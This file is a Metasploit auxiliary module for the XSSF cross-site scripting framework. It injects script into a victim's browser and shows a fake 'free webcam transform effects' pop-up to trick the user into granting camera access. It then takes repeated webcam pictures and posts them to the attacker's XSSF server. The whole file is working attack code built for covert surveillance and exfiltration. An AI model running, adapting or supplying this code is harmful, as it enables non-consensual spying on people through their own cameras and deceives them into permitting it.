require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Webcam Capture',
			'Description' => 'Takes a picture with the victim webcam and return result to XSSF'
		))
		
		
		register_options(
			[
				OptInt.new('nbCaptures', [true, 'Numbers of captures to take with victim webcam', 3]),
				OptInt.new('interval', [true, 'Interval between two captures in seconds', 1])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		if (req.uri =~ /\.html/)
			random = Rex::Text.rand_text_alphanumeric(rand(10) + 5)
			
			code = %Q{
				<html>
					<head>
						<script type="text/javascript" src="resources/jquery.js"></script>
						<script type="text/javascript" src="resources/jquery.webcam.js"></script>
						
						<style type="text/css">
							#webcam, #canvas#{random} { 	width: 320px; 	border:20px solid #333; 	background:#eee; 	-webkit-border-radius: 20px; 	-moz-border-radius: 20px; border-radius: 20px; }
							#webcam {	position:relative;	margin-top:50px;	margin-bottom:50px; }
							#webcam > span {	z-index:2;	position:absolute;	color:#eee;	font-size:10px;	bottom: -16px;	left:152px; }
							#webcam > img {	z-index:1;	position:absolute;	border:0px none;	padding:0px;	bottom:-40px;	left:89px; }
							#webcam > div {	border:5px solid #333;	position:absolute;	right:-90px;	padding:5px;	-webkit-border-radius: 8px;	-moz-border-radius: 8px;	border-radius: 8px;	cursor:pointer; }
							#webcam a {	background:#fff;	font-weight:bold; }
							#webcam a > img {	border:0px none; } 
							#canvas#{random} {	border:20px solid #ccc;	background:#eee; }
							#flash {	position:absolute;	top:0px;	left:0px;	z-index:5000;	width:100%;	height:500px;	background-color:#c00; 	display:none; }
							object {	display:block; /* HTML5 fix */	position:relative;	z-index:1000; }
						</style>
					</head>
					<body style="background-color:#eee;">

						<div id="webcam"><img src='data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAKIAAAFuBAMAAADwgd5TAAAAA3NCSVQICAjb4U/gAAAAMFBMVEX///8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzOGvfDjAAAAEHRSTlMAESIzRFVmd4iZqrvM3e7/dpUBFQAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAwOS8xMi8xMAU3cskAAAAfdEVYdFNvZnR3YXJlAE1hY3JvbWVkaWEgRmlyZXdvcmtzIDi1aNJ4AAADUklEQVR4nO2dr48TQRTH99otLdcTWESPGhwpCASuTSgCDPwHPYFAIEhwmFZwghCyQPCcAF0MCRh6IQTbkCBwDUhMw6/w42iHnZlNoJ2ZnfdmN6jvR+7b+e68NzPfnanYRhEAAID/T9wObFjp2a9fFeJRkOAFIV7brp8QKaMAwYZs+NK8vjGTgR8BiolsuDhiXN8Uih5bMNYN94xAVwf22YpbuuEXI5DowGe24knd0KzXRAe+shUv6oYHLsXvbMWhR7HEPmaP+sRWPOZKLivwE7Zi0zWkjYLzcWRGpoX6+NsSOVporO/ZQudnSyGWp5iC1bkQ88UDVzRgGcpFmNOLId99kvxKtdijLUf6TYF4QB/SHH6xFMe+OslH7jAED3mTkml/YCh2/IUf21zEzcRfpe30odfIgvX07veee2rWV4YL+XK65LtpbH1T2pFvZP/U2GbsAxqEpHVpvhEVB7Sip8O3pKW9MadNjA7Zd5vEyVsn++6QOtMmRN+tEpPWb8V9wn1b5E1NnbjrS+jLa0ry3djxBrTRJflui7FeZdr+xTXmeMqM4LvSaxdUQbXd8k3dDmsj17Du3laZMBwlOzfk10jWmux6kU47fxy7zN3rYV8PVBZ3GYrSp3KrJCtN9LyMgcd3fXGTzfw+qBz2WIqqidt3m+ykdVpu3x2yk8564fLdan4GdirzHN+VXrtsMxVVYi7fTYKOAE336SYOO6aotO2+2wpKWqdt991xUNLZ2X7HEpBeG/BbgT7cWH1Xem3eEcbN0OG7k8Cks7RN362HJp1NEtN3u2GHZkVi813ltSE/NElatpO4OtnzzmV/UWmvW8ygQNJRdLrf758lXAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4qd6Yixw+Xg/QjO849RY3A/t5ZmYXfBf0LVtFbWITfBqsl1J5aAreLyKYFtNI/G0xQf0p8X/5WVQwitby5nyG3EFzRZDzRxsuaiuK3C9y24hXFPn/RWRSfh/Lr2OyOtajwoKlz8d4ur5mXhUTLH1d18amoBCPwwXL9seyPbzs98zx23lyioPdNlkuvvLCqydZPrtMkTt3iyaXiT7f7a0J/AHxN1p6n6es5QAAAABJRU5ErkJggg==' alt=''/><span>Webcam!</span></div>

						<canvas id="canvas#{random}" height="240" width="320" style="display:none"></canvas>

						<script type="text/javascript">
							var captureloop = null;
							var nbcaptures = #{datastore['nbCaptures']};
							var pos = 0;
							var ctx = null;
							var image = null;

							jQuery("#webcam").webcam({

								width: 320,
								height: 240,
								mode: "callback",
								swffile: "resources/jscam.swf",


								onSave: function(data) {
									var col = data.split(";");
									var img = image;

									for(var i = 0; i < 320; i++) {
										var tmp = parseInt(col[i]);
										img.data[pos + 0] = (tmp >> 16) & 0xff;
										img.data[pos + 1] = (tmp >> 8) & 0xff;
										img.data[pos + 2] = tmp & 0xff;
										img.data[pos + 3] = 0xff;
										pos+= 4;
									}

									if (pos >= 0x4B000) {
										ctx.putImageData(img, 0, 0);
										pos = 0;
									}
								},

								onCapture: function () {
									webcam.save();
								},
							});

							window.addEventListener("load", function() {
								var canvas#{random} = document.getElementById("canvas#{random}");

								if (canvas#{random}.getContext) {
									ctx = document.getElementById("canvas#{random}").getContext("2d");
									ctx.clearRect(0, 0, 320, 240);
									image = ctx.getImageData(0, 0, 320, 240);
								}
							}, false);
							
							function takePicture() {
								webcam.capture();
								XSSF_POST(document.getElementById("canvas#{random}").toDataURL("image/png"), '#{self.name}');
								
								nbcaptures--;
								
								if (nbcaptures == 0)
									clearInterval(captureloop);
							}
							
							function startCapture() {
								captureloop = setInterval(takePicture, #{datastore['interval']} * 1000);
							}
							
							setTimeout(startCapture, 5000);		// Waiting for victim webcam access aprobation
						</script>
					</body>
				</html>

			}
		else
			random = Rex::Text.rand_text_alphanumeric(rand(10) + 5)
			
			code = %Q{
				s = document.createElement('script');
				s.src = XSSF_SERVER + "resources/jquery.js";
				document.body.appendChild(s);

				s = document.createElement('style');
				s.innerHTML = "#osx-modal-content#{random}, #osx-modal-data#{random} {display:none;}";
				s.innerHTML +="#osx-overlay#{random} {background-color:#000; cursor:wait;}";
				s.innerHTML +="#osx-container#{random} {background-color:#eee; color:#000; font: 16px/24px 'Lucida Grande',Arial,sans-serif; padding-bottom:4px; width:600px; -moz-border-radius-bottomleft:6px; -webkit-border-bottom-left-radius:6px; -moz-border-radius-bottomright:6px; -webkit-border-bottom-right-radius:6px; border-radius:0 0 6px 6px; -moz-box-shadow:0 0 64px #000; -webkit-box-shadow:0 0 64px #000; box-shadow:0 0 64px #000;}";
				s.innerHTML +="#osx-container#{random} a {color:#ddd;}";
				s.innerHTML +="#osx-container#{random} #osx-modal-title#{random} {color:#000; background-color:#ddd; border-bottom:1px solid #ccc; font-weight:bold; padding:6px 8px; text-shadow:0 1px 0 #f4f4f4;}";
				s.innerHTML +="#osx-container#{random} .close {display:none; position:absolute; right:0; top:0;}";
				s.innerHTML +="#osx-container#{random} .close a {display:block; color:#777; font-weight:bold; padding:6px 12px 0; text-decoration:none; text-shadow:0 1px 0 #f4f4f4;}";
				s.innerHTML +="#osx-container#{random} .close a:hover {color:#000;}";
				s.innerHTML +="#osx-container#{random} #osx-modal-data#{random} {font-size:12px; padding:6px 12px;}";
				
				s.innerHTML +="input[type='file'] {opacity: 0; position: absolute; left: 230; bottom: 5; width: 300px; line-height: 20px; height: 25px; }";
				s.innerHTML +="#cloak#{random} { position: absolute; left: 230;  cursor:pointer; bottom: 5; line-height: 20px; height: 25px; } ";
				document.body.appendChild(s);
				
				d = document.createElement('div');
				d.id = "osx-modal-content#{random}";
				d.style.display = "none";
				d.innerHTML = "<div id='osx-modal-title#{random}'>Webcam Transform Effects!</div><div id='osx-modal-data#{random}'><center><p style='background-color:#eee;'>Please try our new webcam transform effects for free!</p></center><br/><center> <iframe src='" + XSSF_SERVER + "webcam.html' width=370px height=350px style='z-index:9999; display: block; width:370px; height:350px; border: none; overflow-y: hidden; overflow-x: hidden;'></iframe></center></div>";
				document.body.appendChild(d);
			
				function func1() {
					s = document.createElement('script');
					s.src = XSSF_SERVER + "resources/jquery.simplemodal.js";
					document.body.appendChild(s);
				}

				function func2() {
					jQuery(function ($) {
						var OSX = {
							container: null,
							init: function () {

									$("#osx-modal-content#{random}").modal({
										overlayId: 'osx-overlay#{random}',
										containerId: 'osx-container#{random}',
										closeHTML: null,
										minHeight: 80,
										opacity: 65, 
										position: ['0',],
										overlayClose: true,
										onOpen: OSX.open,
										onClose: OSX.close
									});
							},
							open: function (d) {
								var self = this;
								self.container = d.container[0];
								d.overlay.fadeIn('slow', function () {
									$("#osx-modal-content#{random}", self.container).show();
									var title = $("#osx-modal-title#{random}", self.container);
									title.show();
									d.container.slideDown('slow', function () {
										setTimeout(function () {
											var h = $("#osx-modal-data#{random}", self.container).height()
												+ title.height()
												+ 20; // padding
											d.container.animate(
												{height: h}, 
												200,
												function () {
													$("div.close", self.container).show();
													$("#osx-modal-data#{random}", self.container).show();
												}
											);
										}, 300);
									});
								})
							},
							close: function (d) {
								var self = this; // this = SimpleModal object
								d.container.animate(
									{top:"-" + (d.container.height() + 20)},
									500,
									function () {
										self.close(); // or $.modal.close();
									}
								);
							}
						};

						OSX.init();
					});
				}
				
				setTimeout(func1, 1000);
				setTimeout(func2, 2500);
			}
		end
		
		send_response(cli, code)
	end
end